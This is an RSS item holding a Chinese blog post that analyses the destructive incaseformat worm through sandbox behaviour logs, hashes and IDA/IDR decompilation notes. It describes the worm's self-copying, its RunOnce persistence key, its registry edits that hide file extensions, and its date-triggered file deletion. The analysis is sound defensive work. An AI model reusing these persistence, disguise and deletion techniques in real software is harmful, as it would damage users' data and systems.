			<pubDate>Fri, 29 Jan 2021 11:47:34 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/incaseformat/</guid>
			<description>incaseformat样本分析 0. 前言 从关于病毒的新闻可以知道这是一个具有删除和自我复制的病毒； 从别人对病毒的评价可以知道这是一个很棒的练手</description>
			<content type="html"><![CDATA[<h1 id="incaseformat样本分析">incaseformat样本分析</h1>
<h2 id="0-前言">0. 前言</h2>
<p>从关于<a href="https://mp.weixin.qq.com/s/JWUIK9JTrlFMXozl1LmNlw">病毒的新闻</a>可以知道这是一个具有删除和自我复制的病毒；</p>
<p>从别人对<a href="https://mp.weixin.qq.com/s/B-d9ctMwPoiO6D_ptbmhBw">病毒的评价</a>可以知道这是一个很棒的练手工具。</p>
<p>这是我分析的第一个样本，其中一定会有遗漏的地方，以及牵强之处，希望大家多多批评指正。</p>
<h2 id="1-行为捕获">1. 行为捕获</h2>
<p>直接运行样本，并使用火绒剑进行行为捕获：</p>
<pre><code>16:43:31:605,	tsay.exe,	1064:0,	1064,	EXEC_create,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Users\ALEE\Desktop\incaseformat\tsay.exe&quot; ' image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:745,	tsay.exe,	1064:0,	1064,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000074DB0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:823,	tsay.exe,	1064:0,	1064,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000073CB0000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:870,	tsay.exe,	1064:2276,	1064,	FILE_touch,	C:\windows\tsay.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000002 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:43:31:886,	tsay.exe,	1064:2276,	1064,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00070600 ,	0x00000000 [操作成功完成。  ],	
16:43:31:886,	tsay.exe,	1064:2276,	1064,	FILE_read,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:901,	tsay.exe,	1064:2276,	1064,	FILE_write,	C:\windows\tsay.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:901,	tsay.exe,	1064:0,	1064,	FILE_modified,	C:\windows\tsay.exe,	,	0x00000000 [操作成功完成。  ],	
16:43:31:901,	tsay.exe,	1064:2276,	1064,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:'43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E ' ,	0x00000000 [操作成功完成。  ],	
16:43:31:917,	tsay.exe,	1064:0,	1064,	EXEC_destroy,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Users\ALEE\Desktop\incaseformat\tsay.exe&quot; ' ,	0x00000000 [操作成功完成。  ],	
</code></pre><p>将时间设置为1月13日，以管理员权限运行木马程序：</p>
<pre><code>16:42:32:202,	tsay.exe,	2568:0,	0,	EXEC_create,	C:\Windows\system32\SystemSettingsAdminFlows.exe,	parent_pid:5808 cmdline:'&quot;C:\Windows\system32\SystemSettingsAdminFlows.exe&quot; SetDateTime' image_base:0x00007FF6B6C80000 image_size:0x00080000 ,	0x00000000 [操作成功完成。  ],	
16:42:32:499,	tsay.exe,	2568:0,	0,	EXEC_module_load,	C:\Windows\System32\vm3dum64_10.dll,	base:0x00007FFB01970000 size:0x00061000 ,	0x00000000 [操作成功完成。  ],	
16:42:33:321,	tsay.exe,	2568:6180,	0,	REG_setval,	HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-655661564-3040666061-2252561177-1000\\Device\HarddiskVolume3\Windows\System32\SystemSettingsAdminFlows.exe,	type:0x00000003 datalen:24 data:'28 BB 33 09 88 E9 D6 01 00 00 00 00 00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:42:33:321,	tsay.exe,	2568:0,	0,	EXEC_destroy,	C:\Windows\system32\SystemSettingsAdminFlows.exe,	parent_pid:5808 cmdline:'&quot;C:\Windows\system32\SystemSettingsAdminFlows.exe&quot; SetDateTime' ,	0x00000000 [操作成功完成。  ],	
16:45:41:433,	tsay.exe,	2568:0,	2568,	EXEC_create,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Windows\tsay.exe&quot; ' image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:464,	tsay.exe,	2568:0,	2568,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000074DB0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:511,	tsay.exe,	2568:0,	2568,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000073CB0000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:511,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:'43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E ' ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170197 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170196 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170196 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00160197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00160197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00160196 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120196 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120196 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:589,	tsay.exe,	2568:0,	2568,	EXEC_destroy,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Windows\tsay.exe&quot; ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:041,	tsay.exe,	5748:0,	5748,	EXEC_create,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Windows\tsay.exe&quot; ' image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:135,	tsay.exe,	5748:0,	5748,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000074DB0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:197,	tsay.exe,	5748:0,	5748,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000073CB0000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:'43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_touch,	C:\windows\ttry.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:48:06:244,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\ttry.exe,	eof:0x00070600 ,	0x00000000 [操作成功完成。  ],	
16:48:06:244,	tsay.exe,	5748:7604,	5748,	FILE_write,	C:\windows\ttry.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:244,	tsay.exe,	5748:0,	5748,	FILE_modified,	C:\windows\ttry.exe,	,	0x00000000 [操作成功完成。  ],	
16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,	type:0x00000004 datalen:4 data:'00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,	type:0x00000004 datalen:4 data:'00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:963,	tsay.exe,	5748:0,	5748,	PROC_exec,	C:\windows\ttry.exe,	target_pid:8840 cmdline:'&quot;C:\windows\ttry.exe&quot; ' ,	0x00000000 [操作成功完成。  ],	
16:48:07:010,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Notifications\Data\418A073AA3BC3475,	type:0x00000003 datalen:446 data:'05 09 00 00 00 00 00 00 04 00 04 00 01 02 06 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:07:072,	tsay.exe,	5748:0,	5748,	EXEC_destroy,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Windows\tsay.exe&quot; ' ,	0x00000000 [操作成功完成。  ],	
</code></pre><p>生成的ttry.exe文件的动作如下：</p>
<pre><code>17:18:04:679,	ttry.exe,	9128:0,	9076,	EXEC_create,	C:\windows\ttry.exe,	parent_pid:9076 cmdline:'&quot;C:\windows\ttry.exe&quot; ' image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:710,	ttry.exe,	9128:0,	9076,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000075BA0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:0,	9076,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000074810000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00070600 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_read,	C:\windows\ttry.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_write,	C:\windows\tsay.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:0,	9076,	FILE_modified,	C:\windows\tsay.exe,	,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:'43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E ' ,	0x00000000 [操作成功完成。  ],	
17:18:05:741,	ttry.exe,	9128:9132,	9076,	FILE_touch,	D:\share.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000002 options:0x00000064 ,	0x00000000 [操作成功完成。  ],	
17:18:05:741,	ttry.exe,	9128:9132,	9076,	FILE_read,	C:\windows\ttry.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
17:18:05:741,	ttry.exe,	9128:9132,	9076,	FILE_write,	D:\share.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
17:18:05:741,	ttry.exe,	9128:0,	9076,	FILE_modified,	D:\share.exe,	,	0x00000000 [操作成功完成。  ],	
17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden,	type:0x00000004 datalen:4 data:'02 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\checkedvalue,	type:0x00000004 datalen:4 data:'00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_rmval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\checkedvalue,	keyname:'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt' ,	0x00000000 [操作成功完成。  ],	
</code></pre><p>当时间调整为1月13日，运行ttry.exe动作如下：</p>
<pre><code>17:25:44:420,	ttry.exe,	7808:588,	7808,	FILE_truncate,	D:\incaseformat.log,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	

......

17:25:53:524,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
17:25:53:534,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden,	type:0x00000004 datalen:4 data:'02 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
17:25:53:551,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\checkedvalue,	type:0x00000004 datalen:4 data:'00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
17:25:54:434,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\$RECYCLE.BIN\S-1-5-21-655661564-3040666061-2252561177-1000\desktop.ini,	,	0x00000000 [操作成功完成。  ],	
17:25:54:443,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\3rd-party-licenses.txt,	,	0x00000000 [操作成功完成。  ],	
17:25:54:447,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\ca-bundle.crt,	,	0x00000000 [操作成功完成。  ],	
17:25:54:456,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\CHANGELOG,	,	0x00000000 [操作成功完成。  ],	
</code></pre><h2 id="2行为分析">2.行为分析</h2>
<p>在非删文件夹日期运行样本会创建C:\windows\tsay.exe，并将路径添加到开机自启的注册表中；</p>
<p>在删文件夹日期运行C:\windows\tsay.exe将会创建C:\windows\ttry.exe并执行起来，设置internet选项（不知道是拿来干啥）；</p>
<p>在非删文件夹日期运行C:\windows\ttry.exe，将会重置tsay.exe和启动项，然后将除c盘外的盘符中的文件夹，修改成文件夹名.exe，并修改注册表，隐藏文件夹后缀名（win10中并未生效）；</p>
<p>在删除文件夹日期运行C:\windows\ttry.exe，将会新建incaseformat.log，并删除其他文件。</p>
<h2 id="3样本分析">3.样本分析</h2>
<h3 id="31样本信息">3.1样本信息</h3>
<pre><code>C:\Users\ALEE\Desktop\incaseformat样本&gt;certutil -hashfile tsay.exe sha256
SHA256 的 tsay.exe 哈希:
8c8793eb7c80a09e1542e424ea89c23c195d364892620562e06b3df602890929
CertUtil: -hashfile 命令成功完成。

C:\Windows&gt;certutil -hashfile tsay.exe sha256
SHA256 的 tsay.exe 哈希:
8c8793eb7c80a09e1542e424ea89c23c195d364892620562e06b3df602890929
CertUtil: -hashfile 命令成功完成。

C:\Windows&gt;certutil -hashfile ttry.exe sha256
SHA256 的 ttry.exe 哈希:
8c8793eb7c80a09e1542e424ea89c23c195d364892620562e06b3df602890929
CertUtil: -hashfile 命令成功完成。

</code></pre><h3 id="32查壳情况">3.2查壳情况</h3>
<p>查一下壳，无壳delphi。</p>
<p><img src="/inc_images/2696940148582.png" alt=""></p>
<p>delphi程序使用<code>dede</code>和<code>idr</code>，可视化上要比直接使用<code>ida</code>好许多，这里使用的是<code>idr+ida</code>进行静态反汇编（<code>idr</code>查看结构，导出map，<code>ida</code>导入<code>map</code>，c代码生成，方便阅读）。</p>
<p>注：这里采用的时<code>ida7.5</code></p>
<h3 id="33静态分析">3.3静态分析</h3>
<p><code>idr</code>载入样本<code>ttry.exe</code>，查看<code>forms</code>，导出<code>map</code>。这里可以看到作者生存意识极强。</p>
<p><img src="/inc_images/1734812110161.png" alt=""></p>
<h4 id="formcreate分析">FormCreate分析</h4>
<p><code>ida</code>载入样本，导入<code>map</code>，查看<code>FormCreate</code>，<code>F5</code>代码生成，可以看到第61-73进行了一次文件是否存在的检查，不存在将进行自我复制。</p>
<p><img src="/inc_images/398113140163.png" alt=""></p>
<p>下方存在一次判断，如果为真，则将自身复制为ttry.exe，并新建进程启动。</p>
<p><img src="/inc_images/5034917158589.png" alt=""></p>
<h4 id="timer1timer分析">Timer1Timer分析</h4>
<p>该模块中有两个函数，从函数内进行分析，发现第一个函数存在驱动盘符读取的功能，第二个函数暂时不知道是什么功能……</p>
<p><img src="/inc_images/5336152186622.png" alt=""></p>
<p>进入函数<code>sub_44E5C8</code>函数观察上下文，</p>
<p><img src="/inc_images/713754179291.png" alt=""></p>
<p>进入<code>sub_44E54C</code>函数可以得知其功能是判断是否是有效磁盘。</p>
<p><img src="/inc_images/4288158175846.png" alt=""></p>
<h4 id="timer2timer分析">Timer2Timer分析</h4>
<p>该模块中有两个函数，第一个函数是磁盘信息的，第二个函数是删除文件及文件夹的函数。</p>
<p><img src="/inc_images/4515747158592.png" alt=""></p>
<p>在第37行到第60行，开始获取当前的年月日，如果年份小于2010或月份小于4月则不执行删除操作。如果大于2009或大于3月，却日期等于1、10、21、29号，则执行删除操作。</p>
<p><code>sub_44EC70</code>函数内容如下：</p>
<p><img src="/inc_images/1697453146459.png" alt=""></p>
<h4 id="timer3timer分析">Timer3Timer分析</h4>
<p>整个模块未引入其他函数，比较明显的是一些注册表操作</p>
<p><img src="/inc_images/3140339176625.png" alt=""></p>
<h4 id="timer4timer分析">Timer4Timer分析</h4>
<p>该模块的功能很简单，利用<code>TFileStream</code>文件流形式创建<code>incaseformat.log</code></p>
<p><img src="/inc_images/1496356169294.png" alt=""></p>
<h2 id="4结语">4.结语</h2>
<p>本次样本耗时很长，期间断断续续的进行了三四次，多线程是个好东西，就是不适合多长线程。分析过程中遇到的痛点和难点总结如下：</p>
<ul>
<li>注册表键值所对应的含义</li>
<li>delphi函数名称</li>
</ul>
]]></content>
		</item>
		
	</channel>
</rss>
